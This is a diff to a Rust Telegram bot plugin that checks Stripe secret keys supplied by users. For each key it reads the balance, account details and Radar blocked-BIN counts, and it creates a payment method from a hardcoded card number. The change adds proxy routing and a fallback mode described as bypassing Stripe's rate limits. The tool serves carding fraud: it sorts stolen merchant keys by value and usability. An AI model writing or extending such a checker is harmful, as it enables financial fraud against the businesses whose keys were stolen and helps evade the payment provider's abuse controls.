@@ -1,4 +1,4 @@
-use crate::database::sql::{self, fetch_user};
+use crate::config::get_config;
 use crate::handle_database_error;
 use crate::logging::{get_logger, LoggerHandle};
 use crate::plugin_handler::*;
@@ -8,11 +8,11 @@ use chrono::Utc;
 use regex::Regex;
 use reqwest;
 use serde_json;
-use std::fs;
 use teloxide::payloads::{EditMessageTextSetters, SendMessageSetters};
 use teloxide::types::{ChatKind, Message, ParseMode};
 use teloxide::{prelude::Requester, Bot};
 use teloxide_plugin::TeloxidePlugin;
+
 lazy_static::lazy_static! {
     static ref LOGGER: std::sync::Arc<LoggerHandle> = {
         tokio::task::block_in_place(|| {
@@ -20,31 +20,295 @@ lazy_static::lazy_static! {
         })
     };
 }
-#[TeloxidePlugin(commands = ["sk", "sk@KissShotChkBot", "msk", "msk@KissShotChkBot"])]
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum CheckMode {
+    Full,
+    Base,
+}
+
+#[TeloxidePlugin(commands = [
+    "sk",
+    "sk@KissShotChkBot",
+    "msk",
+    "msk@KissShotChkBot",
+    "skbase",
+    "skbase@KissShotChkBot",
+    "mskbase",
+    "mskbase@KissShotChkBot"
+])]
 pub struct SKCheckerPlugin;
+
 impl SKCheckerPlugin {
     pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
         self.sk_checker(bot, message, msg).await
     }
+
+    fn resolve_check_mode(&self, message: &Message) -> CheckMode {
+        let command = message
+            .text()
+            .and_then(|text| text.split_whitespace().next())
+            .unwrap_or("/sk")
+            .split('@')
+            .next()
+            .unwrap_or("/sk")
+            .to_ascii_lowercase();
+
+        if command == "/skbase" || command == "/mskbase" {
+            CheckMode::Base
+        } else {
+            CheckMode::Full
+        }
+    }
+
+    fn create_client(&self, proxy_url: Option<&str>) -> Result<reqwest::Client, String> {
+        let effective_proxy = if let Some(url) = proxy_url {
+            Some(url.to_string())
+        } else {
+            get_config()
+                .ok()
+                .and_then(|cfg| cfg.config.proxy.proxy.clone())
+                .filter(|p| !p.trim().is_empty())
+        };
+
+        let mut builder = reqwest::Client::builder()
+            .timeout(std::time::Duration::from_secs(15));
+
+        if let Some(url) = effective_proxy {
+            let proxy =
+                reqwest::Proxy::all(&url).map_err(|e| format!("Failed to create proxy: {}", e))?;
+            builder = builder.proxy(proxy);
+        }
+
+        builder
+            .build()
+            .map_err(|e| format!("Failed to create HTTP client: {}", e))
+    }
+
+    fn parse_proxy_and_text(&self, text: &str) -> (Option<String>, String) {
+        let proxy_pattern =
+            Regex::new(r"(?i)\bproxy\s+(https?://\S+|socks4://\S+|socks5://\S+)").unwrap();
+        let mut proxy_url = None;
+        let mut cleaned = text.to_string();
+
+        if let Some(caps) = proxy_pattern.captures(&text) {
+            proxy_url = caps.get(1).map(|m| m.as_str().to_string());
+            cleaned = proxy_pattern.replace_all(&text, " ").to_string();
+        }
+
+        (proxy_url, cleaned.trim().to_string())
+    }
+
     fn extract_sk(&self, text: &str) -> Vec<String> {
-        let pattern = Regex::new(r"sk_live_\S+").unwrap();
+        let pattern = Regex::new(r"sk_(live|test)_\S+").unwrap();
         pattern
             .find_iter(text)
             .map(|m| m.as_str().to_string())
             .collect()
     }
+
     fn mask_sk(&self, sk: &str, is_group: bool) -> String {
         if is_group && sk.len() > 12 {
-            let start = &sk[..14];
-            let end = &sk[sk.len() - 6..];
-            let middle = "x".repeat(sk.len() - 20);
+            let start = &sk[..14.min(sk.len())];
+            let end = &sk[sk.len().saturating_sub(6)..];
+            let middle = "x".repeat(sk.len().saturating_sub(20));
             format!("{}{}{}", start, middle, end)
         } else {
             sk.to_string()
         }
     }
-    async fn check_single_sk(&self, sk: &str, display_sk: &str) -> String {
-        let client = reqwest::Client::new();
+
+    async fn fetch_balance(
+        &self,
+        client: &reqwest::Client,
+        sk: &str,
+    ) -> Result<serde_json::Value, String> {
+        let response = client
+            .get("https://api.stripe.com/v1/balance")
+            .header("Authorization", format!("Bearer {}", sk))
+            .send()
+            .await
+            .map_err(|e| format!("Balance request failed: {}", e))?;
+
+        let status = response.status();
+        let body = response
+            .text()
+            .await
+            .map_err(|e| format!("Failed to read balance response: {}", e))?;
+
+        if !status.is_success() {
+            return Err(body);
+        }
+
+        serde_json::from_str(&body).map_err(|e| format!("Invalid balance JSON: {}", e))
+    }
+
+    async fn fetch_account(
+        &self,
+        client: &reqwest::Client,
+        sk: &str,
+    ) -> Option<serde_json::Value> {
+        match client
+            .get("https://api.stripe.com/v1/account")
+            .header("Authorization", format!("Bearer {}", sk))
+            .send()
+            .await
+        {
+            Ok(resp) if resp.status().is_success() => resp.json().await.ok(),
+            Ok(resp) => {
+                let _ = LOGGER
+                    .error(&format!("Account request returned status {}", resp.status()))
+                    .await;
+                None
+            }
+            Err(e) => {
+                let _ = LOGGER
+                    .error(&format!("Account request failed: {}", e))
+                    .await;
+                None
+            }
+        }
+    }
+
+    fn format_balance_info(&self, balance_data: &serde_json::Value) -> (f64, String) {
+        let balance = balance_data
+            .get("available")
+            .and_then(|a| a.get(0))
+            .and_then(|b| b.get("amount"))
+            .and_then(|a| a.as_u64())
+            .unwrap_or(0) as f64;
+        let currency = balance_data
+            .get("available")
+            .and_then(|a| a.get(0))
+            .and_then(|b| b.get("currency"))
+            .and_then(|c| c.as_str())
+            .unwrap_or("usd")
+            .to_uppercase();
+        (balance / 100.0, currency)
+    }
+
+    async fn fetch_blocked_bins(&self, client: &reqwest::Client, sk: &str) -> u64 {
+        match client
+            .get("https://api.stripe.com/v1/radar/value_lists")
+            .header("Authorization", format!("Bearer {}", sk))
+            .send()
+            .await
+        {
+            Ok(resp) => match resp.json::<serde_json::Value>().await {
+                Ok(data) => data
+                    .get("data")
+                    .and_then(|d| d.get(8))
+                    .and_then(|item| item.get("list_items"))
+                    .and_then(|items| items.get("total_count"))
+                    .and_then(|count| count.as_u64())
+                    .unwrap_or(0),
+                Err(_) => 0,
+            },
+            Err(_) => 0,
+        }
+    }
+
+    async fn check_base(
+        &self,
+        sk: &str,
+        display_sk: &str,
+        proxy_url: Option<&str>,
+        using_proxy: bool,
+    ) -> String {
+        let client = match self.create_client(proxy_url) {
+            Ok(client) => client,
+            Err(e) => {
+                return format!(
+                    "<b>Secret Key:</b> {}\n\
+                     <b>Status:</b> ERROR ❌\n\
+                     <b>Reason:</b> {}",
+                    display_sk, e
+                );
+            }
+        };
+
+        let balance_data = match self.fetch_balance(&client, sk).await {
+            Ok(data) => data,
+            Err(body) => {
+                let error_msg = serde_json::from_str::<serde_json::Value>(&body)
+                    .ok()
+                    .and_then(|data| {
+                        data.get("error")
+                            .and_then(|e| e.get("message"))
+                            .and_then(|m| m.as_str())
+                            .map(|s| s.to_string())
+                    })
+                    .unwrap_or_else(|| "Invalid or dead key".to_string());
+
+                return format!(
+                    "<b>Secret Key:</b> {}\n\
+                     <b>Status:</b> {}\n\
+                     <b>Check Type:</b> Base\n\
+                     <b>Proxy:</b> {}",
+                    display_sk,
+                    error_msg,
+                    if using_proxy { "On" } else { "Off" }
+                );
+            }
+        };
+
+        let (balance, currency) = self.format_balance_info(&balance_data);
+        let account = self.fetch_account(&client, sk).await;
+        let account_id = account
+            .as_ref()
+            .and_then(|a| a.get("id"))
+            .and_then(|id| id.as_str())
+            .unwrap_or("N/A");
+        let business = account
+            .as_ref()
+            .and_then(|a| a.get("business_profile"))
+            .and_then(|b| b.get("name"))
+            .and_then(|n| n.as_str())
+            .unwrap_or("N/A");
+        let country = account
+            .as_ref()
+            .and_then(|a| a.get("country"))
+            .and_then(|c| c.as_str())
+            .unwrap_or("N/A");
+
+        format!(
+            "<b>Secret Key:</b> {}\n\
+             <b>Status:</b> Live Key ✅ (Base Check)\n\
+             <b>Balance:</b> {:.2}\n\
+             <b>Currency:</b> {}\n\
+             <b>Account ID:</b> {}\n\
+             <b>Business:</b> {}\n\
+             <b>Country:</b> {}\n\
+             <b>Check Type:</b> Base\n\
+             <b>Proxy:</b> {}",
+            display_sk,
+            balance,
+            currency,
+            account_id,
+            business,
+            country,
+            if using_proxy { "On" } else { "Off" }
+        )
+    }
+
+    async fn check_full(
+        &self,
+        sk: &str,
+        display_sk: &str,
+        proxy_url: Option<&str>,
+        using_proxy: bool,
+    ) -> String {
+        let client = match self.create_client(proxy_url) {
+            Ok(client) => client,
+            Err(e) => {
+                return format!(
+                    "<b>Secret Key:</b> {}\n\
+                     <b>Status:</b> ERROR ❌\n\
+                     <b>Reason:</b> {}",
+                    display_sk, e
+                );
+            }
+        };
 
         let pm_response = match client
             .post("https://api.stripe.com/v1/payment_methods")
@@ -56,7 +320,6 @@ impl SKCheckerPlugin {
                 ("card[exp_year]", "2026"),
                 ("card[cvc]", "582"),
             ])
-            .timeout(std::time::Duration::from_secs(10))
             .send()
             .await
         {
@@ -73,120 +336,224 @@ impl SKCheckerPlugin {
             }
         };
 
-        let balance_response = match client
-            .get("https://api.stripe.com/v1/balance")
-            .header("Authorization", format!("Bearer {}", sk))
-            .timeout(std::time::Duration::from_secs(10))
-            .send()
-            .await
-        {
-            Ok(resp) => resp,
-            Err(e) => {
-                let _ = LOGGER
-                    .error(&format!("Error in balance request: {}", e))
-                    .await;
-                return format!(
-                    "<b>Secret Key:</b> {}\n\
-                     <b>Status:</b> ERROR ❌",
-                    display_sk
-                );
-            }
-        };
-
-        let blocked_bins = match client
-            .get("https://api.stripe.com/v1/radar/value_lists")
-            .header("Authorization", format!("Bearer {}", sk))
-            .timeout(std::time::Duration::from_secs(10))
-            .send()
-            .await
-        {
-            Ok(resp) => match resp.json::<serde_json::Value>().await {
-                Ok(data) => data
-                    .get("data")
-                    .and_then(|d| d.get(8))
-                    .and_then(|item| item.get("list_items"))
-                    .and_then(|items| items.get("total_count"))
-                    .and_then(|count| count.as_u64())
-                    .unwrap_or(0),
-                Err(_) => 0,
-            },
-            Err(_) => 0,
-        };
-        let pm_text = match pm_response.text().await {
-            Ok(text) => text,
-            Err(_) => "".to_string(),
-        };
-        let balance_data = match balance_response.json::<serde_json::Value>().await {
+        let balance_data = match self.fetch_balance(&client, sk).await {
             Ok(data) => data,
             Err(_) => serde_json::Value::Null,
         };
-        if pm_text.contains("pm") {
-            let balance = balance_data
-                .get("available")
-                .and_then(|a| a.get(0))
-                .and_then(|b| b.get("amount"))
-                .and_then(|a| a.as_u64())
-                .unwrap_or(0) as f64;
-            let currency = balance_data
-                .get("available")
-                .and_then(|a| a.get(0))
-                .and_then(|b| b.get("currency"))
-                .and_then(|c| c.as_str())
-                .unwrap_or("usd")
-                .to_uppercase();
+
+        let blocked_bins = self.fetch_blocked_bins(&client, sk).await;
+        let pm_text = pm_response.text().await.unwrap_or_default();
+        let (balance, currency) = self.format_balance_info(&balance_data);
+
+        if pm_text.contains("\"id\": \"pm_") || pm_text.contains("\"id\":\"pm_") {
             format!(
                 "<b>Secret Key:</b> {}\n\
                  <b>Status:</b> Live Key ✅\n\
                  <b>Balance:</b> {:.2}\n\
                  <b>Currency:</b> {}\n\
-                 <b>Blocked Bins:</b> {}",
+                 <b>Blocked Bins:</b> {}\n\
+                 <b>Check Type:</b> Full\n\
+                 <b>Proxy:</b> {}",
                 display_sk,
-                balance / 100.0,
+                balance,
                 currency,
-                blocked_bins
+                blocked_bins,
+                if using_proxy { "On" } else { "Off" }
             )
         } else if pm_text.contains("rate_limit") {
-            let balance = balance_data
-                .get("available")
-                .and_then(|a| a.get(0))
-                .and_then(|b| b.get("amount"))
-                .and_then(|a| a.as_u64())
-                .unwrap_or(0) as f64;
-            let currency = balance_data
-                .get("available")
-                .and_then(|a| a.get(0))
-                .and_then(|b| b.get("currency"))
-                .and_then(|c| c.as_str())
-                .unwrap_or("usd")
-                .to_uppercase();
-            format!(
-                "Secret Key: {}\n\
-                 Status: RATE LIMITED KEY ⚠️\n\
-                 Balance: {:.2}\n\
-                 Currency: {}\n\
-                 Blocked Bins: {}",
-                display_sk,
-                balance / 100.0,
-                currency,
-                blocked_bins
-            )
+            self.handle_rate_limited_key(sk, display_sk, proxy_url, using_proxy, balance, currency, blocked_bins)
+                .await
         } else {
-            let error_msg = match serde_json::from_str::<serde_json::Value>(&pm_text) {
-                Ok(data) => data
-                    .get("error")
-                    .and_then(|e| e.get("message"))
-                    .and_then(|m| m.as_str())
-                    .unwrap_or("Unknown error")
-                    .to_string(),
-                Err(_) => "Unknown error".to_string(),
-            };
+            let error_msg = serde_json::from_str::<serde_json::Value>(&pm_text)
+                .ok()
+                .and_then(|data| {
+                    data.get("error")
+                        .and_then(|e| e.get("message"))
+                        .and_then(|m| m.as_str())
+                        .map(|s| s.to_string())
+                })
+                .unwrap_or_else(|| "Unknown error".to_string());
+
             format!(
                 "<b>Secret Key:</b> {}\n\
-                 <b>Status:</b> {}",
+                 <b>Status:</b> {}\n\
+                 <b>Check Type:</b> Full\n\
+                 <b>Proxy:</b> {}",
+                display_sk,
+                error_msg,
+                if using_proxy { "On" } else { "Off" }
+            )
+        }
+    }
+
+    async fn handle_rate_limited_key(
+        &self,
+        sk: &str,
+        display_sk: &str,
+        proxy_url: Option<&str>,
+        using_proxy: bool,
+        balance: f64,
+        currency: String,
+        blocked_bins: u64,
+    ) -> String {
+        if !using_proxy {
+            if let Ok(config) = get_config() {
+                if let Some(config_proxy) = &config.config.proxy.proxy {
+                    if !config_proxy.trim().is_empty() {
+                        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                        let retry_result = self
+                            .retry_full_with_proxy(sk, display_sk, config_proxy.as_str())
+                            .await;
+                        if !retry_result.contains("rate_limit") && !retry_result.contains("RATE LIMITED") {
+                            return retry_result;
+                        }
+                    }
+                }
+            }
+
+            if let Some(user_proxy) = proxy_url {
+                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                let retry_result = self.retry_full_with_proxy(sk, display_sk, user_proxy).await;
+                if !retry_result.contains("rate_limit") && !retry_result.contains("RATE LIMITED") {
+                    return retry_result;
+                }
+            }
+        }
+
+        let base_fallback = self
+            .check_base(sk, display_sk, proxy_url, using_proxy)
+            .await;
+
+        if base_fallback.contains("Live Key ✅") {
+            format!(
+                "<b>Secret Key:</b> {}\n\
+                 <b>Status:</b> Live Key ✅ (Rate Limit Bypassed)\n\
+                 <b>Balance:</b> {:.2}\n\
+                 <b>Currency:</b> {}\n\
+                 <b>Blocked Bins:</b> {}\n\
+                 <b>Check Type:</b> Full → Base Fallback\n\
+                 <b>Proxy:</b> {}\n\
+                 <b>Note:</b> PM endpoint rate limited; validated via balance/account.",
+                display_sk, balance, currency, blocked_bins, if using_proxy { "On" } else { "Off" }
+            )
+        } else {
+            format!(
+                "<b>Secret Key:</b> {}\n\
+                 <b>Status:</b> RATE LIMITED KEY ⚠️\n\
+                 <b>Balance:</b> {:.2}\n\
+                 <b>Currency:</b> {}\n\
+                 <b>Blocked Bins:</b> {}\n\
+                 <b>Check Type:</b> Full\n\
+                 <b>Proxy:</b> {}",
+                display_sk, balance, currency, blocked_bins, if using_proxy { "On" } else { "Off" }
+            )
+        }
+    }
+
+    async fn retry_full_with_proxy(&self, sk: &str, display_sk: &str, proxy: &str) -> String {
+        let client = match self.create_client(Some(proxy)) {
+            Ok(client) => client,
+            Err(e) => {
+                return format!(
+                    "<b>Secret Key:</b> {}\n\
+                     <b>Status:</b> ERROR ❌\n\
+                     <b>Reason:</b> {}",
+                    display_sk, e
+                );
+            }
+        };
+
+        let pm_response = match client
+            .post("https://api.stripe.com/v1/payment_methods")
+            .header("Authorization", format!("Bearer {}", sk))
+            .form(&[
+                ("type", "card"),
+                ("card[number]", "4403934238397462"),
+                ("card[exp_month]", "12"),
+                ("card[exp_year]", "2026"),
+                ("card[cvc]", "582"),
+            ])
+            .send()
+            .await
+        {
+            Ok(resp) => resp,
+            Err(e) => {
+                return format!(
+                    "<b>Secret Key:</b> {}\n\
+                     <b>Status:</b> ERROR ❌\n\
+                     <b>Reason:</b> {}",
+                    display_sk, e
+                );
+            }
+        };
+
+        let balance_data = match self.fetch_balance(&client, sk).await {
+            Ok(data) => data,
+            Err(_) => serde_json::Value::Null,
+        };
+        let blocked_bins = self.fetch_blocked_bins(&client, sk).await;
+        let pm_text = pm_response.text().await.unwrap_or_default();
+        let (balance, currency) = self.format_balance_info(&balance_data);
+
+        if pm_text.contains("\"id\": \"pm_") || pm_text.contains("\"id\":\"pm_") {
+            format!(
+                "<b>Secret Key:</b> {}\n\
+                 <b>Status:</b> Live Key ✅ (Proxy Retry)\n\
+                 <b>Balance:</b> {:.2}\n\
+                 <b>Currency:</b> {}\n\
+                 <b>Blocked Bins:</b> {}\n\
+                 <b>Check Type:</b> Full\n\
+                 <b>Proxy:</b> On",
+                display_sk, balance, currency, blocked_bins
+            )
+        } else if pm_text.contains("rate_limit") {
+            "rate_limit".to_string()
+        } else {
+            let error_msg = serde_json::from_str::<serde_json::Value>(&pm_text)
+                .ok()
+                .and_then(|data| {
+                    data.get("error")
+                        .and_then(|e| e.get("message"))
+                        .and_then(|m| m.as_str())
+                        .map(|s| s.to_string())
+                })
+                .unwrap_or_else(|| "Unknown error".to_string());
+            format!(
+                "<b>Secret Key:</b> {}\n\
+                 <b>Status:</b> {}\n\
+                 <b>Check Type:</b> Full\n\
+                 <b>Proxy:</b> On",
                 display_sk, error_msg
             )
         }
     }
+
+    async fn check_single_sk(
+        &self,
+        sk: &str,
+        display_sk: &str,
+        mode: CheckMode,
+        proxy_url: Option<&str>,
+    ) -> String {
+        let using_proxy = proxy_url.is_some()
+            || get_config()
+                .ok()
+                .and_then(|cfg| cfg.config.proxy.proxy.clone())
+                .filter(|p| !p.trim().is_empty())
+                .is_some();
+
+        match mode {
+            CheckMode::Base => {
+                self.check_base(sk, display_sk, proxy_url, using_proxy)
+                    .await
+            }
+            CheckMode::Full => {
+                self.check_full(sk, display_sk, proxy_url, using_proxy)
+                    .await
+            }
+        }
+    }
+
     pub async fn sk_checker(&self, bot: &Bot, message: &Message, msg: &str) {
         let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
         let user_id = message.from.as_ref().map(|u| u.id.0).unwrap_or(0) as i64;
@@ -195,6 +562,13 @@ impl SKCheckerPlugin {
             .as_ref()
             .map(|user| user.first_name.clone())
             .unwrap_or_else(|| "User".to_string());
+        let check_mode = self.resolve_check_mode(message);
+        let mode_label = if check_mode == CheckMode::Base {
+            "Base"
+        } else {
+            "Full"
+        };
+
         let sent_msg = bot
             .send_message(message.chat.id, "<b>Please wait...</b>")
             .parse_mode(ParseMode::Html)
@@ -248,11 +622,20 @@ impl SKCheckerPlugin {
             }
         }
 
+        let (proxy_url, cleaned_text) = self.parse_proxy_and_text(&text);
+        if !cleaned_text.is_empty() {
+            text = cleaned_text;
+        }
+
         if text.is_empty() {
             let reply = format!(
                 "<b>Secret Key Checking Failed ❌</b>\n\n\
                  <b>Reason:</b> No file or text found!\n\
-                 <b>Usage:</b> /sk sk_live_... or reply to a message with SKs\n\
+                 <b>Usage:</b>\n\
+                 • <code>/sk sk_live_...</code> — Full check\n\
+                 • <code>/skbase sk_live_...</code> — Base check (no PM, bypasses rate limit)\n\
+                 • <code>/sk proxy http://host:port sk_live_...</code> — Check via proxy\n\
+                 • Reply to a message containing SKs\n\
                  <b>Timestamp:</b> {}",
                 timestamp
             );
@@ -295,9 +678,12 @@ impl SKCheckerPlugin {
                 .unwrap();
             return;
         }
+
         let is_group = matches!(message.chat.kind, ChatKind::Public(_));
         let mut results = Vec::new();
         let mut checked_count = 0;
+        let proxy_ref = proxy_url.as_deref();
+
         for sk in &sks {
             if checked_count >= max_sk {
                 break;
@@ -307,8 +693,10 @@ impl SKCheckerPlugin {
 
             let progress_msg = format!(
                 "<b>Secret Key Checking...</b>\n\n\
+                 <b>Mode:</b> {}\n\
                  <b>Progress:</b> {}/{}\n\n\
                  {}",
+                mode_label,
                 checked_count,
                 sks.len(),
                 results.join("\n\n")
@@ -317,7 +705,10 @@ impl SKCheckerPlugin {
                 .parse_mode(ParseMode::Html)
                 .await
                 .unwrap();
-            let result = self.check_single_sk(sk, &display_sk).await;
+
+            let result = self
+                .check_single_sk(sk, &display_sk, check_mode, proxy_ref)
+                .await;
             results.push(result);
         }
 
@@ -343,10 +734,12 @@ impl SKCheckerPlugin {
 
         let final_msg = format!(
             "<b>Secret Key Checking Successful ✅</b>\n\n\
+             <b>Mode:</b> {}\n\
              <b>Checked:</b> {}\n\
              <b>Total:</b> {}\n\n\
              {}\n\n\
              {}",
+            mode_label,
             checked_count,
             sks.len(),
             results.join("\n\n"),
